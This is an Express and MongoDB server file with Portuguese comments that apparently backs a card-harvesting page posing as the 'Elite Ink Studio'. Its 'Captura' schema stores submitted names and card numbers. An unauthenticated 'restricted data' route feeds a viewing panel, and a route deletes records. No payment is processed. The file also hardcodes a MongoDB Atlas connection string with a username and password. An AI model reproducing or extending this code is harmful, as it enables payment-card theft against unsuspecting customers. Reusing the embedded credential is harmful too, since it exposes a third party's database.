const express = require('express');
const mongoose = require('mongoose');
const app = express();

app.use(express.json());
app.use(express.static('.'));

// Link que você copiou do MongoDB Atlas (Foto 6)
const mongoURI = "mongodb+srv://ingresso944_db_user:Dks10dks@cluster0.wgnfod3.mongodb.net/?appName=Cluster0";

mongoose.connect(mongoURI)
    .then(() => console.log("🍃 MongoDB Atlas Conectado com Sucesso!"))
    .catch(err => console.error("❌ Erro ao conectar ao Mongo:", err));

// Esquema de Dados para capturar nome e cartão no Elite Ink Studio
const CapturaSchema = new mongoose.Schema({
    nome: String,
    cartao: String,
    data: { type: String, default: () => new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }) }
});

const Captura = mongoose.model('Captura', CapturaSchema);

// --- ROTAS ---

app.post('/finalizar', async (req, res) => {
    try {
        const nova = new Captura(req.body);
        await nova.save();
        console.log("✅ Dados salvos no MongoDB:", req.body.nome);
        res.send("Ok");
    } catch (err) { res.status(500).send("Erro ao salvar"); }
});

app.get('/ver-dados-restritos', async (req, res) => {
    try {
        const dados = await Captura.find().sort({ _id: -1 });
        // Ajuste para o painel.html continuar lendo "id" corretamente
        res.json(dados.map(d => ({ id: d._id, nome: d.nome, cartao: d.cartao, data: d.data })));
    } catch (err) { res.status(500).json({ error: "Erro ao buscar" }); }
});

app.delete('/excluir/:id', async (req, res) => {
    try {
        await Captura.findByIdAndDelete(req.params.id);
        res.send("Removido");
    } catch (err) { res.status(500).send("Erro ao remover"); }
});

// Porta dinâmica para hospedagem online (Render, Railway, etc.)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Servidor ON na porta ${PORT}`);
    console.log(`📂 Painel: http://localhost:${PORT}/painel.html`);
});